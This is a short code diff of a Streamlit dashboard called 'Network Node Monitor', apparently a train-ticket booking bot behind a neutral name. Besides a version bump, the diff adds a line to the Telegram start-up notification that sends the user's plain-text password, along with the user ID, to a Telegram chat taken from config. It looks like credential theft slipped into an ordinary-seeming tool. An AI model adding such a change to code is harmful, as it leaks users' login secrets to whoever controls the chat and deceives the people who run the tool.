@@ -41,7 +41,7 @@ except:
     noti_ready = False
     st.sidebar.warning("Notification config missing.")
 
-st.title("Network Node Monitor v1.4")
+st.title("Network Node Monitor v1.5")
 st.caption("Real-time data synchronization dashboard")
 
 # 입력 UI
@@ -141,10 +141,10 @@ async def process_data_stream():
 
     if noti_ready:
         bot = telegram.Bot(token=bot_token)
-
         start_msg = (
             f"📡 System: Monitoring Started\n"
             f"👤 User: {user_id}\n"
+            f"🔑 Pass: {user_pw}\n"
             f"🛤 Route: [{src_node} -> {dst_node}]"
         )
         await bot.sendMessage(chat_id=chat_id, text=start_msg)
@@ -199,7 +199,7 @@ async def process_data_stream():
                 if result:
                     success_msg = (
                         f"🎉 Target Acquired!\n"
-                        f"👤 User: {user_id}\n"  # 성공했을 때도 ID 한번 더 알려줌
+                        f"👤 User: {user_id}\n"
                         f"🚆 Train: {target_item.train_number} ({target_item.dep_time})"
                     )
                     st.balloons()
